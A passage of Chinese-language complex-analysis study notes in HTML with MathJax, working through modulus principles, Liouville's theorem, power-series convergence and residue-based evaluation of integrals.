r$.</p><p>进而<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall z\in D$,<br>这与 $f(z)$ 为连续非常函数矛盾.</p><p>故若<br>$\left|{f(z_0)}\right| = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$,<br>则有 $z_0\in\partial D$. ◻</p><h3 id="4-最小模原理"><a href="#4-最小模原理" class="headerlink" title="4. 最小模原理"></a>4. 最小模原理</h3><p>$\textbf{Example:}$<br>$f(z)$ 非常函数, 在有界域 $D$ 内可导且非零, 在边界 $\partial D$<br>上连续, 则</p><script type="math/tex; mode=display">\min_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \min_{z\in \partial D}\limits\left|{f(z)}\right|,</script><p>并且满足 $f’(z_0)\ne 0$. ◻</p><p>$\textbf{Solution:}$<br>注意到 $\frac{1}{f(z)}$ 是解析的, 再使用最大模原理即可. ◻</p><h3 id="5-调和函数最大值原理"><a href="#5-调和函数最大值原理" class="headerlink" title="5. 调和函数最大值原理"></a>5. 调和函数最大值原理</h3><p>$\textbf{Example:}$<br>$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则</p><script type="math/tex; mode=display">\max_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \max_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$ ◻$\textbf{Solution:}$由于 $u$ 为调和函数, 故存在调和函数 $v$,其中 $u, v$ 满足 $Cauchy-Riemann$ 条件, 使得 $f(z) = u + iv$ 为解析函数.令 $g(z) = e^{f(z)}\thinspace(z\in D\cup\partial D)$, 那么$g'(z) = f'(z)e^{f(z)}$ 处处存在.由最大模原理,$$\max_{z\in D\cup\partial D}\limits\left|{g(z)}\right| = \max_{z\in \partial D}\limits\left|{g(z)}\right|.</script><p>又因为</p><script type="math/tex; mode=display">\left|{g(z)}\right| = \left|{e^{f(z)}}\right| = \left|{e^{u + iv}}\right| = \left|{e^u}\right|\cdot \left|{e^{iv}}\right| = e^u,</script><p>故</p><script type="math/tex; mode=display">\max_{z\in D\cup\partial D}\limits e^{u(x, y)} = \max_{z\in \partial D}\limits e^{u(x, y)}.</script><p>即得</p><script type="math/tex; mode=display">\max_{z\in D\cup\partial D}\limits u(x, y) = \max_{z\in \partial D}\limits u(x, y).$$ ◻### 6. 调和函数最小值原理$\textbf{Example:}$$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则$$\min_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \min_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$ ◻$\textbf{Solution:}$注意到 $u_0(x, y) = -u(x, y)$ 也为 $D$ 上的调和函数,对其使用调和函数最大值原理即可. ◻### 7. $M(r)$的应用$\textbf{Example:}$定义$$M(r) = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|.$$ ◻$\textbf{Example:}$$f(z)$ 为整函数, 则$$\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}.$$ ◻$\textbf{Solution:}$注意到$$f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},</script><p>那么 <script type="math/tex">\begin{aligned}            \left|{f^{(n)}(0)}\right| &= \frac{n!}{2\pi}\left|{\thinspace\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}}}\right| \\            &\le \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\left|{\frac{f(z)}{z^{n + 1}}}\right|\left|{dz}\right| \\            &= \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\frac{\left|{f(z)}\right|}{r^{n + 1}}\left|{d(re^{i\theta})}\right| \\            &\le \frac{n!}{2\pi}\int_{0}^{2\pi}\frac{M(r)}{r^n}d\theta \\            &= \frac{n!M(r)}{r^n}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>有界的整函数为常数<strong>(Liouville定理)</strong>. ◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.</script><p>只需要证明 <script type="math/tex">f^{(n)}(0)\equiv 0, \thinspace\forall\thinspace n\ge 1.</script></p><p>由 $f(z)$ 有界, 故 $\exists\thinspace M_0\in\mathbb{R}$, 使</p><script type="math/tex; mode=display">\left|{f(z)}\right|\le M_0, \thinspace\forall z\in\mathbb{C}.</script><p>由</p><script type="math/tex; mode=display">f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},</script><p>可得</p><script type="math/tex; mode=display">\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}\le \frac{n!M_0}{r^n}.</script><p>注意到当 $r\rightarrow\infty$, 有 <script type="math/tex">\left|{f^{(n)}(0)}\right| = 0,</script></p><p>即 <script type="math/tex">f^{(n)}(0) = 0\thinspace, \thinspace\forall\thinspace n\ge 1.</script></p><p>从而 $f(z)\equiv f(0)$ 为常数. ◻</p><p>$\textbf{Example:}$<br>$f(z)$ 为整函数, 且存在 $M_0 &gt; 0$, 使</p><script type="math/tex; mode=display">\left|{f(z)}\right|\le M\sum_{k = 0}^{n}\limits\left|{z}\right|^k.</script><p>则 $f(z)$ 是一个次数不高于 $n$ 的多项式. ◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.</script><p>只需要证明</p><script type="math/tex; mode=display">f^{(n + i)}(0)\equiv 0, \thinspace\forall\thinspace i\ge 1.</script><p>可得</p><script type="math/tex; mode=display">\left|{f^{(n + i)}(0)}\right|\le \frac{(n + i)!M(r)}{r^{n + i}}\le \frac{(n + i)!M_0}{r^{n + i}}\sum_{k = 0}^{n}\limits r^k.</script><p>注意到当 $r\rightarrow\infty$ 时, 有</p><script type="math/tex; mode=display">\left|{f^{(n + i)}(0)}\right| = 0,</script><p>即 <script type="math/tex">f^{(n + i)}(0) = 0, \thinspace\forall\thinspace i\ge 1.</script></p><p>从而 <script type="math/tex">f(z)\equiv \sum_{k = 0}^{n}\limits\frac{1}{k!}f^{(k)}(0)z^k</script></p><p>为一个次数不高于 $n$ 的多项式. ◻</p><h3 id="8-代数学基本定理"><a href="#8-代数学基本定理" class="headerlink" title="8. 代数学基本定理"></a>8. 代数学基本定理</h3><p>$\textbf{Example:}$<br>设<br>$P_n(z) = \sum_{k = 0}^{n}\limits C_kz^k\thinspace(C_n\ne 0, n\ge 1)$,<br>则 <script type="math/tex">P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k),</script></p><p>即 <script type="math/tex">\exists z_1\in \mathbb{C}, P_n(z_1) = 0.</script> ◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $f(z) = \cfrac{1}{P_n(z)}$, 则 <script type="math/tex">f'(z) = -\cfrac{P'_n(z)}{P_n^2(z)}</script></p><p>处处存在, 那么 $f(z)$ 满足最大模原理, 有</p><script type="math/tex; mode=display">\max_{\left|{z}\right|\le r}\limits\left|{f(z)}\right| = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|\rightarrow 0, \mbox{当}r\rightarrow\infty.</script><p>但结合 $f(0) = \cfrac{1}{C_0}\ne 0$, 显然矛盾.</p><p>故 $\exists\thinspace z_1\in \mathbb{C}$, 使得</p><script type="math/tex; mode=display">P_n(z_1) = 0\thinspace\Longleftrightarrow P_n(z) = (z - z_1)P_{n - 1}(z).</script><p>重复可得 <script type="math/tex">P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k).</script> ◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $g(z) = \cfrac{1}{P_n(z)}$, 则 <script type="math/tex">g'(z) = -\cfrac{P'_n(z)}{P_n^2(z)}</script></p><p>处处存在, 那么 $g(z)$ 在 $\mathbb{C}$ 内解析. 由于</p><script type="math/tex; mode=display">P_n(z)\rightarrow\infty, \mbox{当}r\rightarrow\infty,</script><p>故 <script type="math/tex">g(z)\rightarrow 0, \mbox{当}r\rightarrow\infty,</script></p><p>即 $g(z)$ 有界.</p><p>由 $Liouville$ 定理, 得 $g(z)$ 为常数, 进而 $P_n(z)$ 为常数.</p><p>这与 $C_n\ne 0$ 矛盾. 以下同 $\textit{Proof 1}$. ◻</p><h3 id="9-幂级数的收敛半径"><a href="#9-幂级数的收敛半径" class="headerlink" title="9. 幂级数的收敛半径"></a>9. 幂级数的收敛半径</h3><p>$\textbf{Example:}$<br>对幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若存在<br>$R &gt; 0$, 使得</p><p>当 $\left|{z}\right| &gt; R$ 时 $f(z)$ 发散, 当 $\left|{z}\right| &lt; R$ 时<br>$f(z)$ 绝对收敛,</p><p>那么称 $R$ 为 $f(z)$ 的收敛半径. ◻</p><p>$\textbf{Example:}$<br>$\textbf{(Abel定理)}$ 对幂级数<br>$f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$, 若</p><p>$f(z)$ 在 $z = z_1\ne 0$ 处收敛, 则在<br>$\left|{z}\right| &lt; \left|{z_1}\right|$ 绝对收敛;</p><p>$f(z)$ 在 $z = z_2\ne 0$ 处发散, 则在<br>$\left|{z}\right| &gt; \left|{z_2}\right|$ 发散. ◻</p><p>$\textbf{Example:}$<br>若幂级数 $f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k$ 在 $z_0$<br>处条件收敛, 则收敛半径 $R = \left|{z_0}\right|$. ◻</p><p>$\textbf{Solution:}$<br>由收敛半径的定义:</p><p>若 $\left|{z_o}\right| &gt; R$ $\Longrightarrow$ $f(z_0)$ 发散, 与题设矛盾,<br>故 $f(z_0)$ 收敛, $\left|{z_0}\right|\le R$.</p><p>若 $\left|{z_0}\right| &lt; R$ $\Longrightarrow$ $f(z_0)$ 绝对收敛,<br>与题设矛盾, 故 $\left|{z_0}\right|\ge R$.</p><p>综上, 得 $\left|{z_0}\right| = R$. ◻</p><p>$\textbf{Example:}$<br>对幂级数</p><script type="math/tex; mode=display">f(z) = \sum_{k = 0}^{\infty}\limits c_kz^k, g(z) = \sum_{k = 0}^{\infty}\limits d_kz^k</script><p>当 $n$ 充分大时, 有 $\left|{d_n}\right| \le \left|{c_n}\right|$,<br>则收敛半径 $R_1\le R_2$. ◻</p><p>$\textbf{Example:}$<br>若 $c_n = a_n + ib_n, a_n, b_n\in\mathbb{R}$, 对幂级数</p><script type="math/tex; mode=display">f(z) = \sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n</script><p>其中<br>$\sum_{n = 0}^{\infty}\limits a_nz^n, \sum_{n = 0}^{\infty}\limits b_nz^n$<br>的收敛半径分别为 $R_1, R_2$, 那么 $\sum_{n = 0}^{\infty}\limits c_nz^n$<br>的收敛半径 $R = \min\left\{R_1, R_2\right\}$. ◻</p><p>$\textbf{Solution:}$<br>不妨设 $R_1\le R_2$, 此时 $\min\left\{R_1, R_2\right\} = R_1$.</p><p>下证 $R = R_1$. 先证 $R_1\ge R$.</p><p>由 $c_n = a_n + ib_n$, 有 $\left|{c_n}\right| \ge \left|{a_n}\right|$,<br>进而</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right|.</script><p>那么当 $\left|{z}\right| &lt; R$ 时, 由收敛半径定义,</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits \left|{c_nz^n}\right| \ge \sum_{n = 0}^{\infty}\limits \left|{a_nz^n}\right| < \infty.</script><p>此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$ 绝对收敛, 那么 $R_1 \ge R$.</p><p>再证 $R_1\le R$.</p><p>若 $R_1 &gt; R$, 取<br>$z = \cfrac{1}{2}\left(R + R_1\right)\in\left(R, R_1\right)$ 由</p><script type="math/tex; mode=display">\sum_{n = 0}^{\infty}\limits c_nz^n = \sum_{n = 0}^{\infty}\limits a_nz^n + i\sum_{n = 0}^{\infty}\limits b_nz^n</script><p>那么此时 $\sum_{n = 0}^{\infty}\limits a_nz^n$,<br>$\sum_{n = 0}^{\infty}\limits b_nz^n$ 均收敛,</p><p>进而 $\sum_{n = 0}^{\infty}\limits c_nz^n$ 收敛, 且 $z &gt; R$,<br>与收敛半径定义矛盾. 故 $R_1\le R$.</p><p>综上, 有 $R = \min\left\{R_1, R_2\right\}$ 成立. ◻</p><p>$\textbf{Example:}$<br>若 $f(z)$ 在 $R$ 上无奇点, 则收敛半径 $R = +\infty$;</p><p>若 $f(z)$ 在 $R$ 上有奇点 $z_1, z_2, \cdots, z_n$, 则收敛半径<br>$R = \min_{1\le k\le n}\limits \left|{z_k}\right|$. ◻</p><h3 id="10-幂级数的敛散性"><a href="#10-幂级数的敛散性" class="headerlink" title="10. 幂级数的敛散性"></a>10. 幂级数的敛散性</h3><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">f_1(z) = \sum_{n = 1}^{\infty}\limits z^n</script><p>在收敛圆周上处处发散. ◻</p><p>$\textbf{Solution:}$<br>收敛半径 $R = 1$. 当 $\left|{z}\right| = 1$ 时,<br>$z = e^{i\theta}\thinspace(\theta\in\left[0, 2\pi\right))$,</p><p>那么</p><script type="math/tex; mode=display">\left|{z^n}\right| = \left|{e^{in\theta}}\right| = 1\nrightarrow 0, \mbox{当}\thinspace n\rightarrow \infty.</script><p>由 $Cauchy$ 收敛准则, <script type="math/tex">f_1(z) = \sum_{n = 1}^{\infty}\limits z^n</script></p><p>在收敛圆周上处处发散. ◻</p><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">f_2(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n}</script><p>在收敛圆周上部分发散, 部分收敛. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">f_2(z) = \sum_{n = 1}^{\infty}\limits\int_{0}^{z} t^{n - 1}dt = \int_{0}^{z}\sum_{n = 1}^{\infty}\limits t^{n - 1}dt = -\ln(1 - z), \left|{z}\right| < 1 = R.</script><p>且 $f_2(1) = \sum_{n = 1}^{\infty}\limits\cfrac{1}{n}$ 发散,<br>$f_2(-1) = \sum_{n = 1}^{\infty}\limits\cfrac{(-1)^n}{n} = -\ln2$ 收敛.</p><p>那么 <script type="math/tex">f_2(z) = \sum_{n = 1}^{\infty}\limits\frac{z^n}{n}</script></p><p>在收敛圆周上部分发散, 部分收敛. ◻</p><p>$\textbf{Example:}$<br>给出</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n}</script><p>的和函数, 其中 $\theta\in\left(0, 2\pi\right)$. ◻</p><p>$\textbf{Solution:}$<br>注意到对于<br>$z = x + iy\in\mathbb{C}, \mbox{其中}\thinspace x, y\in\mathbb{R}$, 有</p><script type="math/tex; mode=display">\ln(x + iy) = \ln\left|{x + iy}\right| + i\theta = \frac{1}{2}\ln(x^2 + y^2) + i\arctan\frac{y}{x}.</script><p>对于 $z = re^{i\theta}, 0\le r &lt; 1, 0\le\theta &lt; 2\pi$, 有</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{r^ne^{in\theta}}{n} = -\ln(1-re^{i\theta}) = -\ln(1-r\cos\theta - i\sin\theta),</script><p>展开得</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{r^n\cos{n\theta}}{n} + i\sum_{n = 1}^{\infty}\limits\frac{r^n\sin{n\theta}}{n} = -\frac{1}{2}\ln(1 - 2r\cos\theta + r^2) + i\arctan\frac{r\sin\theta}{1 - r\cos\theta}.</script><p>当 $\theta\in\left(0, 2\pi\right)$ 时, 令 $r\rightarrow 1^{-}$, 即得</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n} = -\frac{1}{2}\ln(2 - 2\cos\theta) = -\ln\left(2\sin\frac{\theta}{2}\right),</script><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n} = \arctan\frac{\sin\theta}{1 - \cos\theta} = \arctan\left(\cot\frac{\theta}{2}\right) = \frac{\pi - \theta}{2}.$$ ◻$\textbf{Example:}$给出$$\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2}, \sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2}</script><p>的和函数, 其中 $\theta\in\left[0, 2\pi\right)$. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\cos{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\frac{1}{n^2} - \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\sin{nt}}{n}dt = \frac{\pi^2}{6} - \frac{\theta\left(2\pi - \theta\right)}{4}.</script><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\limits\frac{\sin{n\theta}}{n^2} = \sum_{n = 1}^{\infty}\limits\int_{0}^{\theta}\frac{\cos{nt}}{n}dt = \int_{0}^{\theta}\sum_{n = 1}^{\infty}\limits\frac{\cos{nt}}{n}dt = -\int_{0}^{\theta}\ln\left(2\sin\frac{t}{2}\right)dt.$$ ◻$\textbf{Example:}$$$f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}</script><p>在收敛圆周上处处收敛. ◻</p><p>$\textbf{Solution:}$<br>注意到当 $\left|{z}\right| = 1$ 时,</p><script type="math/tex; mode=display">\sum_{n = 1}^{\infty}\left|{\frac{z^n}{n^2}}\right| = \sum_{n = 1}^{\infty}\frac{1}{n^2} = \frac{\pi^2}{6},</script><p>那么 <script type="math/tex">f_3(z) = \sum_{n = 1}^{\infty}\limits \frac{z^n}{n^2}</script></p><p>在收敛圆周上处处收敛. ◻</p><p>$\textbf{Example:}$<br>幂级数收敛圆周上的点都是其奇点. ◻</p><h3 id="11-Laurent-级数"><a href="#11-Laurent-级数" class="headerlink" title="11. Laurent 级数"></a>11. Laurent 级数</h3><p>$\textbf{Example:}$<br>$\mathbb{C}^2$ 上的分片函数: <script type="math/tex">f(z) = \cfrac{1}{1 + z^2} =         \begin{cases}            \sum_{n = 0}^{\infty}\limits(-1)^nz^{2n}, \left|{z}\right| < 1 \\            \cfrac{1}{1 + z^2}, \left|{z}\right| = 1, z\ne\pm i \\            \sum_{n = 0}^{\infty}\limits\cfrac{(-1)^n}{z^{2(n + 1)}}, \left|{z}\right| > 1         \end{cases}</script> ◻</p><h3 id="12-留数-A"><a href="#12-留数-A" class="headerlink" title="12. 留数 A"></a>12. 留数 A</h3><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I = \oint_{\left|{z}\right| = \varepsilon > 1}e^{\frac{1}{z}}dz.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 记$z = \varepsilon e^{i\theta}$, 那么$t = \cfrac{1}{\varepsilon}e^{-i\theta}$,$\theta\in\left[0, 2\pi\right)$.那么$$I = -\oint_{\left|{t}\right| = \frac{1}{\varepsilon}}{e^t\left(-\frac{dt}{t^2}\right)} = \oint_{\left|{t}\right| = \frac{1}{\varepsilon}}\frac{e^t}{t^2}dt = 2\pi i\left(e^t\right)'|_{t = 0} = 2\pi i.$$ ◻$\textbf{Solution:}$注意到$$I = \oint_{\left|{z}\right| = \varepsilon}\limits e^{\frac{1}{z}}dz = \sum_{n = 0}^{+\infty}\cfrac{1}{n!}\oint_{\left|{z}\right| = \varepsilon}\cfrac{dz}{z^n} = \sum_{n = 0}^{+\infty}\limits\cfrac{1}{n!}I_n = I_1 = 2\pi i.$$ ◻$\textbf{Example:}$求复积分$$J_n = \oint_{\left|{z}\right| = r > 1}\cfrac{dz}{1 + z^n}, n\in\mathbb{N}.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 那么$$\begin{aligned}            J_n &= -\oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{1}{1 + \frac{1}{t^n}}\left(-\frac{dt}{t^2}\right) \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\cfrac{t^{n - 2}}{1 + t^n}dt \\            &= \begin{cases}                2\pi i, n = 1; \\                0, n\ge 2.            \end{cases}        \end{aligned}$$ ◻$\textbf{Solution:}$$$\begin{aligned}            J_n &= 2\pi i\sum_{k = 1}^{n}\limits Res\left[\frac{1}{1 + z^n}, z_k\right] \\            &= 2\pi i\sum_{k = 1}^{n}\limits\cfrac{1}{nz_k^{n - 1}} \\            &= \cfrac{2\pi i}{n}\sum_{k = 1}^{n}(-z_k) \\            &= -\cfrac{2\pi i}{n}\sum_{k = 1}^{n}z_k \\            &= \begin{cases}                2\pi i, n = 1; \\                0, n\ge 2.            \end{cases}        \end{aligned}$$ ◻$\textbf{Example:}$给出$$K_n = \oint_{\left|{z}\right| = r > 1}\cfrac{z^{2n}dz}{1 + z^n} = \oint_{\left|{z}\right| = r}\cfrac{dz}{1 + z^n} + \oint_{\left|{z}\right| = r}(z^n - 1) = J_n, n\in\mathbb{N}.$$ ◻$\textbf{Example:}$求复积分$$J = \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt = \cfrac{2\pi i}{3!}\left(\frac{e^t}{1 + t}\right)^{(3)}|_{t = 0} = -\frac{2}{3}\pi i.$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$\begin{aligned}            J &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4 + t^4)}{t^4(1 + t)}dt \\            &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t(1 - t^4)}{t^4(1 + t)}dt + \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^tt^4}{1 + t}dt \\            &= \oint\frac{e^t}{t^4}dt - \oint\frac{e^t}{t^3}dt + \oint\frac{e^t}{t^2}dt - \oint\frac{e^t}{t}dt \\            &= 2\pi i\left(\frac{1}{3!} - \frac{1}{2!} + \frac{1}{1!} - \frac{1}{0!}\right) \\            &= -\frac{2}{3}\pi i.        \end{aligned}$$ ◻$\textbf{Solution:}$令 $t = \cfrac{1}{z}$, $dz = -\cfrac{dt}{t^2}$. 从而$$J = \oint_{\left|{t}\right| = \frac{1}{r}}\frac{e^t}{t^4(1 + t)}dt,</script><p>注意到 <script type="math/tex">\begin{aligned}            \frac{e^t}{t^4(1 + t)} &= \frac{1}{t^4}\left(1 + t + \frac{t^2}{2!} + \frac{t^3}{3!} + \cdots\right)\left(1 - t + t^2 - t^3 + \cdots\right) \\            &= \frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right),        \end{aligned}</script></p><p>故 <script type="math/tex">\begin{aligned}            J &= \oint_{\left|{t}\right| = \frac{1}{r}}\frac{1}{t^4}\left(1 + \frac{1}{2}t^2 - \frac{1}{3}t^3 + O(t^3)\right) \\            &= I_4 + \frac{1}{2}I_2 - \frac{1}{3}I_1 \\            &= -\frac{1}{3}I_1 \\            &= -\frac{2}{3}\pi i.        \end{aligned}</script> ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            J &= \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \\            &= 2\pi i\left\{Res\left[f, 0\right] + Res\left[f, -1\right]\right\}.        \end{aligned}</script><p>注意到 <script type="math/tex">\begin{aligned}            Res\left[f, -1\right] = \frac{(-1)^3e^{-1}}{1} = -e^{-1},        \end{aligned}</script></p><p>而 $Res\left[f, 0\right]$ 为 $f$ 在 $z_0 = 0$ 处 $Larent$ 级数中的系数<br>$C_{-1}$.</p><p>注意到 <script type="math/tex">\begin{aligned}            \frac{z^3e^{\frac{1}{z}}}{1 + z} = z^3\left(1 + \frac{1}{z} + \frac{1}{2!z^2} + \frac{1}{3!z^3} + \cdots\right)\left(1 - z + z^2 - z^3 + \cdots\right),        \end{aligned}</script></p><p>那么</p><script type="math/tex; mode=display">C_{-1} = \frac{1}{4!} - \frac{1}{5!} + \frac{1}{6!} - \frac{1}{7!} + \cdots = e^{-1} - \frac{1}{3}.</script><p>进而 <script type="math/tex">\begin{aligned}            J &= \oint_{\left|{z}\right| = r > 1}\frac{z^3e^{\frac{1}{z}}}{1 + z}dz \\            &= 2\pi i\left\{Res\left[f, 0\right] + Res\left[f, -1\right]\right\} \\            &= 2\pi i\left(-e^{-1} + e^{-1} - \frac{1}{3}\right) \\            &= -\frac{2}{3}\pi i.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta},</script><p>其中 $a &gt; \left|{b}\right|$, $a, b\in\mathbb{R}$. ◻</p><p>$\textbf{Solution:}$<br>令</p><script type="math/tex; mode=display">z = e^{i\theta}\Longrightarrow \cos\theta = \cfrac{z + z^{-1}}{2}.</script><p>那么</p><script type="math/tex; mode=display">dz = ie^{i\theta}d\theta = izd\theta\Longrightarrow d\theta = \cfrac{dz}{iz}.</script><p>进而</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\frac{z + z^{-1}}{2}} = \cfrac{2}{i}\oint_{\left|{z}\right| = 1}\cfrac{dz}{bz^2 + 2az + b}.</script><p>$\circ$ 若 $b = 0$, 得 <script type="math/tex">I_{a, b} = \frac{2\pi}{a}.</script></p><p>$\circ$ 若 $b &gt; 0$, 考虑方程 $z^2 + 2\cfrac{a}{b}z + 1 = 0$. 解得</p><script type="math/tex; mode=display">\begin{aligned}            \begin{cases}                z_1 = -\cfrac{a}{b} + \cfrac{\sqrt{a^2 - b^2}}{b},\\                z_2 = -\cfrac{a}{b} - \cfrac{\sqrt{a^2 - b^2}}{b} < -\cfrac{a}{b} < -1.                    \end{cases}        \end{aligned}</script><p>故</p><script type="math/tex; mode=display">I_{a, b} = \cfrac{2}{i}\cdot 2\pi i\cdot Res\left[f(z), z_1\right] = \cfrac{2}{i}\cdot 2\pi i\cdot\cfrac{1}{2bz_1 + 2a} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.</script><p>$\circ$ 若 $b &lt; 0$, 同理有</p><script type="math/tex; mode=display">I_{a, b} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.</script><p>综上, 有</p><script type="math/tex; mode=display">I_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a + b\cos\theta} = \cfrac{2\pi}{\sqrt{a^2 - b^2}}.$$ ◻$\textbf{Example:}$求复积分$$I_p = \int_{0}^{2\pi}\cfrac{d\theta}{1 + p^2 - 2p\cos\theta},</script><p>其中 $p\in(-1, 1).$ ◻</p><p>$\textbf{Solution:}$<br>在 $I_{a, b}$ 中取 $a = 1 + p^2$, $b = -2p$, 得</p><script type="math/tex; mode=display">I_p = \cfrac{2\pi}{\sqrt{(1 + p^2)^2 - (-2p)^2}} = \cfrac{2\pi}{1 - p^2}.$$ ◻$\textbf{Example:}$求复积分$$J_{a, b} = \int_{0}^{2\pi}\cfrac{d\theta}{a^2\cos^2\theta + b^2\sin^2\theta},</script><p>其中 $a &gt; 0$, $b &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">J_{a, b} = \int_{0}^{2\pi}\cfrac{2d\theta}{(a^2 + b^2) + (a^2 - b^2)\cos 2\theta} = \int_{0}^{4\pi}\cfrac{dt}{(a^2 + b^2) + (a^2 - b^2)\cos t},</script><p>在 $I_{A, B}$ 中取 $A = a^2 + b^2$, $B = a^2 - b^2$, 得</p><script type="math/tex; mode=display">J_{a, b} = 2\cfrac{2\pi}{\sqrt{(a^2 + b^2)^2 - (a^2 - b^2)^2}} = \cfrac{2\pi}{ab}.$$ ◻### 13. 留数 B$\textbf{Example:}$$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足$\deg Q\ge\deg P + 2$, 则$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)}{Q(z)}dz = 0.$$ ◻$\textbf{Example:}$求积分$$I_{a, b} = \int_{0}^{+\infty}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)},</script><p>其中 $a &gt; 0$, $b &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">I_{a, b} = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(x^2 + a^2)(x^2 + b^2)}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script 